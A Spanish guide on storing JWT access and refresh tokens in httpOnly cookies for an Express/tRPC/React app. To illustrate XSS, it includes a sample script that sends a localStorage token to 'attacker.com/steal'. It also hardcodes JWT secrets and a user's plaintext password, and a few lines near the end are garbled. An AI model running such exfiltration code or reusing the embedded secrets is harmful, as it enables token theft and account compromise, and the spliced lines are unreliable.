# 🔐 Seguridad de Autenticación: Access + Refresh Tokens

## 📊 Comparación: localStorage vs Cookie (httpOnly)

### ❌ **localStorage - NO RECOMENDADO para tokens**

```typescript
// ⚠️ VULNERABLE a ataques XSS
localStorage.setItem('token', accessToken);
localStorage.setItem('refreshToken', refreshToken);
```

**Vulnerabilidades**:
- ✗ Accesible desde JavaScript → **XSS (Cross-Site Scripting)**
- ✗ Si un atacante inyecta código malicioso, puede robar tokens
- ✗ Scripts de terceros pueden leer el token
- ✗ Extensiones del navegador pueden acceder

**Ejemplo de ataque XSS**:
```html
<!-- Script malicioso inyectado -->
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>
```

### ✅ **Cookie httpOnly - RECOMENDADO**

```typescript
// ✅ SEGURO contra XSS
// Backend envía cookie en response headers
res.cookie('accessToken', token, {
  httpOnly: true,      // NO accesible desde JavaScript
  secure: true,        // Solo HTTPS en producción
  sameSite: 'strict',  // Previene CSRF
  maxAge: 1 * 60 * 1000 // 1 minuto (testing)
});
```

**Protecciones**:
- ✓ **httpOnly** → JavaScript NO puede leer la cookie (protege contra XSS)
- ✓ **secure** → Solo se envía por HTTPS (protege contra man-in-the-middle)
- ✓ **sameSite** → Previene CSRF (Cross-Site Request Forgery)
- ✓ **maxAge** → Expiración automática

---

## 🔄 Flujo Completo: Access Token + Refresh Token

### **¿Por qué dos tokens?**

```
Access Token (1 minuto para testing, 15 min en prod):
- Vida CORTA → Si lo roban, expira rápido
- Se envía en CADA petición → Mayor exposición
- Contiene roles, permisos, applicationName

Refresh Token (5 minutos para testing, 7 días en prod):
- Vida LARGA → Usuario no necesita relogin frecuente
- Solo se usa para renovar access token → Menos exposición
- Se guarda en httpOnly cookie → Más seguro
```

### **Arquitectura de Seguridad**

```
┌─────────────────────────────────────────────────────────┐
│                    auth_APP (Puerto 4000)               │
├─────────────────────────────────────────────────────────┤
│ JWT_ACCESS_SECRET=asdfA-dsf3-4f5g6h7j8k9l0qwertyuiopASDFG│
│ JWT_REFRESH_SECRET=yjytD.sdf3-4f5asdfaseTR0qwertyuiopASDFG│
│                                                          │
│ Access Token:  1 minuto (testing - prod: 15 min)       │
│ Refresh Token: 5 minutos (testing - prod: 7 días)      │
│                                                          │
│ Cache: roles en memoria (1 min TTL, auto-invalidación)  │
└─────────────────────────────────────────────────────────┘
```

---

## 🚀 Implementación Recomendada (httpOnly Cookie)

### **Fase 1: Backend - secHTTPS_APP**

#### 1.1. Instalar dependencias
```bash
npm install cookie-parser
npm install -D @types/cookie-parser
```

#### 1.2. Configurar cookie-parser en app.ts
```typescript
import cookieParser from 'cookie-parser';

export async function createApp(): Promise<Express> {
  const app = express();
  
  // IMPORTANTE: cookie-parser debe ir ANTES de las rutas
  app.use(cookieParser());
  
  // CORS con credentials
  const allowedOrigins = ['http://localhost:5174', 'http://localhost:5173'];
  app.use(cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true // ← CRÍTICO: permite cookies cross-origin
  }));
  
  // ... resto de configuración
}
```

#### 1.3. Crear middleware de autenticación con cookies
**Archivo**: `src/infrastructure/middleware/authMiddleware.ts`

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

export interface AuthenticatedRequest extends Request {
  user?: {
    userId: string;
    username: string;
    applicationName?: string;
    roles?: string[];
  };
}

const JWT_ACCESS_SECRET = process.env.JWT_ACCESS_SECRET!;

/**
 * Middleware de autenticación JWT con httpOnly cookies
 * Extrae el access token de la cookie y valida
 */
export async function authMiddleware(
  req: AuthenticatedRequest,
  res: Response,
  next: NextFunction
): Promise<void> {
  try {
    // Extraer access token de cookie httpOnly
    const accessToken = req.cookies.accessToken;

    if (!accessToken) {
      res.status(401).json({ 
        error: 'UNAUTHORIZED',
        message: 'No access token provided' 
      });
      return;
    }

    // Verificar JWT
    const decoded = jwt.verify(accessToken, JWT_ACCESS_SECRET) as any;

    // Validar que el token sea para esta aplicación
    const APPLICATION_NAME = process.env.APPLICATION_NAME || 'secHTTPS_APP';
    
    if (decoded.applicationName && decoded.applicationName !== APPLICATION_NAME) {
      res.status(403).json({ 
        error: 'FORBIDDEN',
        message: `Token is not valid for application: ${APPLICATION_NAME}` 
      });
      return;
    }

    // Agregar datos del usuario al request
    req.user = {
      userId: decoded.userId,
      username: decoded.username,
      applicationName: decoded.applicationName,
      roles: decoded.roles || []
    };

    next();

  } catch (error: any) {
    // Token expirado o inválido
    if (error.name === 'TokenExpiredError') {
      res.status(401).json({ 
        error: 'TOKEN_EXPIRED',
        message: 'Access token has expired. Use refresh token to get a new one.' 
      });
      return;
    }

    res.status(401).json({ 
      error: 'INVALID_TOKEN',
      message: 'Invalid access token' 
    });
  }
}
```

#### 1.4. Actualizar contexto tRPC con cookies
**Archivo**: `src/infrastructure/trpc/trpc.ts`

```typescript
import { TRPCError } from '@trpc/server';
import jwt from 'jsonwebtoken';

export interface TRPCContext {
  certificateRepository: ICertificateRepository;
  notificationRepository: INotificationRepository;
  // Datos de autenticación
  userId?: string;
  username?: string;
  applicationName?: string;
  roles?: string[];
}

const t = initTRPC.context<TRPCContext>().create();

export const router = t.router;
export const publicProcedure = t.procedure;

/**
 * Procedimiento protegido: requiere autenticación
 */
export const protectedProcedure = t.procedure.use(async ({ ctx, next }) => {
  if (!ctx.userId) {
    throw new TRPCError({
      code: 'UNAUTHORIZED',
      message: 'You must be logged in to access this resource'
    });
  }

  return next({
    ctx: {
      ...ctx,
      userId: ctx.userId,
      username: ctx.username!,
      roles: ctx.roles || []
    }
  });
});
```

#### 1.5. Actualizar app.ts para extraer token de cookie
**Archivo**: `src/app.ts` (modificar createContext)

```typescript
import jwt from 'jsonwebtoken';

const JWT_ACCESS_SECRET = process.env.JWT_ACCESS_SECRET!;

app.use('/trpc', trpcExpress.createExpressMiddleware({
  router: appRouter,
  createContext: ({ req }): TRPCContext => {
    let userId: string | undefined;
    let username: string | undefined;
    let applicationName: string | undefined;
    let roles: string[] | undefined;

    // Extraer access token de cookie httpOnly
    const accessToken = req.cookies.accessToken;

    if (accessToken) {
      try {
        const decoded = jwt.verify(accessToken, JWT_ACCESS_SECRET) as any;
        userId = decoded.userId;
        username = decoded.username;
        applicationName = decoded.applicationName;
        roles = decoded.roles || [];
      } catch (error) {
        // Token inválido o expirado - contexto sin usuario
        console.warn('Invalid or expired access token');
      }
    }

    return {
      certificateRepository,
      notificationRepository,
      userId,
      username,
      applicationName,
      roles
    };
  }
}));
```

---

### **Fase 2: Frontend - Componente Login y Manejo de Tokens**

#### 2.1. Componente Login con cookies
**Archivo**: `client/src/components/Login.tsx`

```typescript
import { useState } from 'react';
import './Login.css';

interface LoginProps {
  onLoginSuccess: () => void;
}

const AUTH_APP_URL = import.meta.env.VITE_AUTH_APP_URL || 'http://localhost:4000';
const APPLICATION_NAME = import.meta.env.VITE_APPLICATION_NAME || 'secHTTPS_APP';

export function Login({ onLoginSuccess }: LoginProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    try {
      // Llamar a auth_APP con applicationName
      const response = await fetch(`${AUTH_APP_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include', // ← CRÍTICO: incluye cookies en la petición
        body: JSON.stringify({ 
          username, 
          password,
          applicationName: APPLICATION_NAME // ← Especifica la aplicación
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error?.message || 'Login failed');
      }

      const data = await response.json();

      // ✅ Los tokens ya están en cookies httpOnly (enviadas por auth_APP)
      // NO necesitamos guardar en localStorage

      // Guardamos solo datos del usuario (no sensibles)
      localStorage.setItem('user', JSON.stringify({
        id: data.user.id,
        username: data.user.username,
        role: data.user.role
      }));

      console.log('✅ Login exitoso:', data.user.username);
      onLoginSuccess();

    } catch (err: any) {
      setError(err.message || 'Error al conectar con el servidor');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-card">
        <h1>🔒 SecHTTPS</h1>
        <h2>Certificate Manager</h2>
        
        {error && (
          <div className="error-message">
            ⚠️ {error}
          </div>
        )}

        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>Usuario</label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isLoading}
              placeholder="jmuriel"
              required
            />
          </div>

          <div className="form-group">
            <label>Contraseña</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading}
              required
            />
          </div>

          <button type="submit" disabled={isLoading}>
            {isLoading ? 'Iniciando sesión...' : 'Iniciar Sesión'}
          </button>
        </form>

        <p className="login-footer">
          Sistema de gestión de certificados SSL/TLS
        </p>
      </div>
    </div>
  );
}
```

#### 2.2. Actualizar cliente tRPC con credentials
**Archivo**: `client/src/utils/trpc.ts`

```typescript
import { httpBatchLink } from '@trpc/client';
import { createTRPCReact } from '@trpc/react-query';
import type { AppRouter } from '../../../src/infrastructure/trpc/routers';

const AUTH_APP_URL = import.meta.env.VITE_AUTH_APP_URL || 'http://localhost:4000';
const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:3000';

export const trpc = createTRPCReact<AppRouter>();

export const trpcClient = trpc.createClient({
  links: [
    httpBatchLink({
      url: `${BACKEND_URL}/trpc`,
      
      // ✅ Incluir cookies en cada petición
      fetch(url, options) {
        return fetch(url, {
          ...options,
          credentials: 'include', // Envía cookies httpOnly automáticamente
        });
      },

      // Manejo de errores: refresh automático si token expiró
      async onError({ error }) {
        if (error.data?.code === 'UNAUTHORIZED' || error.message.includes('TOKEN_EXPIRED')) {
          console.log('⚠️ Access token expirado, intentando refresh...');
          
          try {
            // Llamar a /auth/refresh (refresh token está en cookie httpOnly)
            const refreshResponse = await fetch(`${AUTH_APP_URL}/auth/refresh`, {
              method: 'POST',
              credentials: 'include' // Envía refresh token automáticamente
            });

            if (refreshResponse.ok) {
              console.log('✅ Token renovado exitosamente');
              // El nuevo access token ya está en la cookie
              // Recargar la página para reintentar con el nuevo token
              window.location.reload();
            } else {
              console.error('❌ Refresh token inválido o expirado');
              // Redirigir a login
              localStorage.removeItem('user');
              window.location.href = '/';
            }
          } catch (refreshError) {
            console.error('❌ Error al renovar token:', refreshError);
            localStorage.removeItem('user');
            window.location.href = '/';
          }
        }
      }
    }),
  ],
});
```

#### 2.3. Logout con limpieza de cookies
**Archivo**: `client/src/components/Dashboard.tsx` (o donde tengas logout)

```typescript
const handleLogout = async () => {
  try {
    // Llamar a endpoint de logout en auth_APP (si existe)
    await fetch(`${AUTH_APP_URL}/auth/logout`, {
      method: 'POST',
      credentials: 'include'
    });
  } catch (error) {
    console.error('Error en logout:', error);
  } finally {
    // Limpiar datos locales
    localStorage.removeItem('user');
    
    // Las cookies httpOnly se limpian automáticamente por el backend
    // o expiran al cerrar navegador si no se especificó maxAge
    
    window.location.href = '/';
  }
};
```

---

## 🔄 Flujo Completo de Autenticación

```
┌──────────────────────────────────────────────────────────────┐
│ 1. LOGIN INICIAL                                             │
└──────────────────────────────────────────────────────────────┘
Frontend → POST /auth/login
           Body: {
             username: "jmuriel",
             password: "Setting@20253",
             applicationName: "secHTTPS_APP"  ← Especifica app
           }
           credentials: 'include'

auth_APP verifica:
  ✓ Credenciales (LDAP o Database)
  ✓ Usuario existe en user_application_roles para secHTTPS_APP
  ✓ Obtiene roles: ['viewer'] o ['admin']
  
auth_APP genera:
  - Access Token (1 min) con applicationName="secHTTPS_APP" y roles
  - Refresh Token (5 min) con applicationName="secHTTPS_APP" y roles

auth_APP responde:
  Set-Cookie: accessToken=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; MaxAge=60
  Set-Cookie: refreshToken=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; MaxAge=300
  Body: {
    accessToken: "eyJhbGc...",  ← (redundante, ya en cookie)
    refreshToken: "eyJhbGc...", ← (redundante, ya en cookie)
    user: { id, username, role }
  }

Frontend:
  ✅ Cookies guardadas automáticamente por navegador
  ✅ Guarda solo user info en localStorage (NO tokens)
  ✅ Redirige a dashboard


┌──────────────────────────────────────────────────────────────┐
│ 2. PETICIONES AUTENTICADAS                                   │
└──────────────────────────────────────────────────────────────┘
Frontend → GET /trpc/certificate.getCertificates?batch=1
           credentials: 'include' ← Navegador envía cookies automáticamente

secHTTPS_APP valida:
  ✓ Extrae accessToken de cookie
  ✓ Verifica con JWT_ACCESS_SECRET
  ✓ Valida applicationName === "secHTTPS_APP"
  ✓ Extrae userId, username, roles

secHTTPS_APP responde:
  200 OK + datos de certificados


┌──────────────────────────────────────────────────────────────┐
│ 3. TOKEN EXPIRADO (después de 1 minuto)                     │
└──────────────────────────────────────────────────────────────┘
Frontend → GET /trpc/certificate.getCertificates?batch=1
           credentials: 'include'

secHTTPS_APP valida:
  ❌ Access token expirado (1 min pasado)
  
secHTTPS_APP responde:
  401 UNAUTHORIZED { error: "TOKEN_EXPIRED" }

Frontend detecta error:
  → onError en tRPC client
  → Automáticamente llama POST /auth/refresh

Frontend → POST /auth/refresh
           credentials: 'include' ← Envía refresh token en cookie

auth_APP valida:
  ✓ Extrae refreshToken de cookie
  ✓ Verifica con JWT_REFRESH_SECRET
  ✓ Refresh token válido (5 min)
  ✓ Obtiene nuevos roles actualizados desde DB

auth_APP genera:
  - Nuevo Access Token (1 min más)
  - Nuevo Refresh Token (5 min más)

auth_APP responde:
  Set-Cookie: accessToken=eyJABC...; HttpOnly; ...
  Set-Cookie: refreshToken=eyJXYZ...; HttpOnly; ...
  Body: { accessToken, refreshToken, user }

Frontend:
  ✅ Nuevas cookies guardadas automáticamente
  ✅ Recarga página: window.location.reload()
  ✅ Reintenta petición original con nuevo access token


┌──────────────────────────────────────────────────────────────┐
│ 4. REFRESH TOKEN EXPIRADO (después de 5 minutos sin login) │
└──────────────────────────────────────────────────────────────┘
Frontend → POST /auth/refresh
           credentials: 'include'

auth_APP valida:
  ❌ Refresh token expirado o inválido
  
auth_APP responde:
  401 UNAUTHORIZED { error: "INVALID_REFRESH_TOKEN" }

Frontend:
  ❌ Limpia localStorage
  ❌ Redirige a login
  → Usuario debe volver a autenticarse
```

---

## ⚙️ Variables de Entorno

### **auth_APP/.env** (ya configurado)
```bash
# JWT Secrets (COMPARTIDOS con secHTTPS_APP para validar tokens)
JWT_ACCESS_SECRET=asdfA-dsf3-4f5g6h7j8k9l0qwertyuiopASDFG
JWT_REFRESH_SECRET=yjytD.sdf3-4f5asdfaseTR0qwertyuiopASDFG

# Puerto del servidor de autenticación
PORT=4000
```

### **secHTTPS_APP/.env** (NUEVO)
```bash
# JWT Configuration (DEBE coincidir con auth_APP)
JWT_ACCESS_SECRET=asdfA-dsf3-4f5g6h7j8k9l0qwertyuiopASDFG
JWT_REFRESH_SECRET=yjytD.sdf3-4f5asdfaseTR0qwertyuiopASDFG

# Application Identity (para validar tokens)
APPLICATION_NAME=secHTTPS_APP

# Auth Service URL
AUTH_APP_URL=http://localhost:4000

# Server Configuration
PORT=3000
CLIENT_URL=http://localhost:5174
```

### **client/.env** (NUEVO)
```bash
# Backend URLs
VITE_AUTH_APP_URL=http://localhost:4000
VITE_BACKEND_URL=http://localhost:3000

# Application Identity (para login)
VITE_APPLICATION_NAME=secHTTPS_APP
```

---

## 🎯 Respuestas a tus Preguntas

### 1. ¿localStorage o Cookie?
✅ **Cookie httpOnly** es MUCHO más seguro:
- **localStorage** → Vulnerable a XSS (JavaScript puede leerlo)
- **httpOnly Cookie** → JavaScript NO puede leerlo (protegido contra XSS)

### 2. ¿Cómo se interactúa con Access/Refresh tokens?
```typescript
// Access Token (1 min para testing):
- Se envía automáticamente en CADA petición (cookie httpOnly)
- Si expira → 401 error → Frontend llama /auth/refresh

// Refresh Token (5 min para testing):
- Solo se usa para renovar access token
- Se envía automáticamente a /auth/refresh (cookie httpOnly)
- Si expira → Usuario debe hacer login de nuevo

// PARA PRODUCCIÓN: cambiar en auth_APP/src/types/shared.ts
// ACCESS_EXPIRATION: '15m'
// REFRESH_EXPIRATION: '7d'
```

### 3. ¿Cómo enviar applicationName desde backend?
```typescript
// client/.env
VITE_APPLICATION_NAME=secHTTPS_APP

// Login.tsx
const APPLICATION_NAME = import.meta.env.VITE_APPLICATION_NAME || 'secHTTPS_APP';

await fetch(`${AUTH_APP_URL}/auth/login`, {
  body: JSON.stringify({ 
    username, 
    password,
    applicationName: APPLICATION_NAME // ← auth_APP filtra roles por esta app
  })
});
```

### 4. ¿Se recuperan roles desde user_application_roles?
✅ **SÍ**, auth_APP ya lo hace automáticamente:
```typescript
// LoginUseCase.ts
const roles = await this.userRepository.getUserRolesByApplication(
  String(user.id),
  applicationName // "secHTTPS_APP"
);

// Ejemplo en DB:
// user_application_roles:
// user_id | application_name | role
// 1       | secHTTPS_APP    | viewer
// 2       | secHTTPS_APP    | admin
```

---

## 🔒 Beneficios de esta Arquitectura
(1 min testing) → Si lo roban, expira rápido
- Refresh token más largo (5 min testing) → UX sin relogin frecuente
- **PRODUCCIÓN**: 15 min access / 7 días refresh
- httpOnly cookies → Protección contra XSS
- sameSite → Protección contra CSRF
- Access token corto → Si lo roban, expira en 15 min
- Refresh token largo → UX sin relogin frecuente

✅ **Arquitectura**:
- auth_APP centraliza min TTL = duración de access token en testing)
- Auto-invalidación al modificar roles vía /admin/*
- Reduce queries a PostgreSQL
- **PRODUCCIÓN**: 15 min TTr_application_roles

✅ **Cache inteligente** (auth_APP):
- Roles en memoria (15 min TTL = duración de access token)
- Auto-invalidación al modificar roles vía /admin/*
- Reduce queries a PostgreSQL

✅ **Escalabilidad**:
- JWT stateless → No necesita sesión en servidor
- Múltiples instancias de secHTTPS_APP pueden validar el mismo token
- auth_APP puede tener múltiples réplicas

---

## 📝 Próximos Pasos

1. **Actualizar .env** con JWT secretos y APPLICATION_NAME
2. **Instalar cookie-parser** en secHTTPS_APP
3. **Implementar authMiddleware** con validación de cookies
4. **Actualizar tRPC context** para extraer usuario de cookie
5. **Crear componente Login** con applicationName
6. **Configurar tRPC client** con credentials y refresh automático
7. **Probar flujo completo**: login → peticiones → refresh → logout
